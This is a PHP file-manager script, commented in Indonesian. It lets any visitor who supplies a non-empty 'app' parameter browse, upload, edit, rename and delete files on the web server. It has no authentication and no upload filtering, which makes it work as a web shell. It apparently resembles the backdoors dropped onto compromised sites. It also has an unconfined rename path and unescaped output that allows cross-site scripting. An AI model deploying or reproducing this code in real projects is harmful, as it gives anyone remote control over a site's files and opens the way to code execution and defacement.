<?php
if (!isset($_GET['app']) || empty($_GET['app'])) {
    http_response_code(403);
    exit('🛑 Missing "app" parameter.');
}
?>
<style>
.breadcrumb {
    background-color: #f8f9fa;
    padding: 10px;
    border-radius: 5px;
    margin: 10px 0;
    border: 1px solid #dee2e6;
}
.breadcrumb a {
    color: #007bff;
    text-decoration: none;
    padding: 2px 5px;
    border-radius: 3px;
}
.breadcrumb a:hover {
    background-color: #e9ecef;
    text-decoration: underline;
}
.upload-section {
    background-color: #f8f9fa;
    padding: 15px;
    border-radius: 5px;
    margin: 10px 0;
    border: 1px solid #dee2e6;
}
.file-table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
}
.file-table th, .file-table td {
    border: 1px solid #dee2e6;
    padding: 8px;
    text-align: left;
}
.file-table th {
    background-color: #e9ecef;
}
</style>
<?php

// Default path = current dir
$baseDir = getcwd(); 
$path = isset($_GET['dir']) ? realpath($_GET['dir']) : $baseDir;

// Prevent path traversal keluar baseDir
if ($path === false || strpos($path, $baseDir) !== 0) {
    $path = $baseDir;
}

// Editing file
if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = realpath($path . DIRECTORY_SEPARATOR . $_GET['file']);
    if ($filepath === false || strpos($filepath, $baseDir) !== 0) {
        exit("❌ Invalid file path");
    }

    if (isset($_POST['edit'])) {
        file_put_contents($filepath, $_POST['content']);
        header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
        exit;
    }
    echo "<h2>Editing: " . htmlspecialchars(basename($filepath)) . "</h2>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>";
    echo htmlspecialchars(file_get_contents($filepath));
    echo "</textarea><br><button type='submit' name='edit'>Save</button></form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . DIRECTORY_SEPARATOR . $_FILES['upload']['name']);
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
    exit;
}

// Rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $old = realpath($path . DIRECTORY_SEPARATOR . $_GET['rename']);
    $new = $path . DIRECTORY_SEPARATOR . $_POST['newname'];
    if ($old && strpos($old, $baseDir) === 0) {
        rename($old, $new);
    }
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $target = realpath($path . DIRECTORY_SEPARATOR . $_GET['delete']);
    if ($target && strpos($target, $baseDir) === 0) {
        if (is_dir($target)) {
            rmdir($target);
        } else {
            unlink($target);
        }
    }
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($path));
    exit;
}

echo "<h2>File Manager</h2>";

// tampilkan current path dengan breadcrumb navigation
echo "<p><b>Path:</b> ";
$pathParts = explode(DIRECTORY_SEPARATOR, str_replace($baseDir, '', $path));
$currentPath = $baseDir;

// Link ke root directory
echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($baseDir) . "'>" . basename($baseDir) . "</a>";

foreach ($pathParts as $part) {
    if (!empty($part)) {
        $currentPath .= DIRECTORY_SEPARATOR . $part;
        echo " / <a href='?app=" . $_GET['app'] . "&dir=" . urlencode($currentPath) . "'>" . htmlspecialchars($part) . "</a>";
    }
}
echo "</p>";

// tampilkan full path untuk referensi
echo "<p><small><b>Full Path:</b> " . htmlspecialchars($path) . "</small></p>";

// tombol upload
echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <button type='submit'>Upload to Current Directory</button>
</form><hr>";

// List files
$files = scandir($path);
echo "<table border='1' cellpadding='5'><tr><th>File</th><th>Action</th></tr>";

// tombol kembali ke parent folder
if ($path !== $baseDir) {
    $parent = dirname($path);
    echo "<tr><td><a href='?app=" . $_GET['app'] . "&dir=" . urlencode($parent) . "'>.. (parent)</a></td><td></td></tr>";
}

foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    echo "<tr><td>";
    if (is_dir($full)) {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($full) . "'>[DIR] $file</a>";
    } else {
        echo $file;
    }
    echo "</td><td>";
    if (is_file($full)) {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&file=" . urlencode($file) . "'>Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&rename=" . urlencode($file) . "'>
        <input name='newname' value='" . htmlspecialchars($file) . "'>
        <button type='submit'>Rename</button>
    </form> | ";
    echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Delete $file?\")'>Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
?>
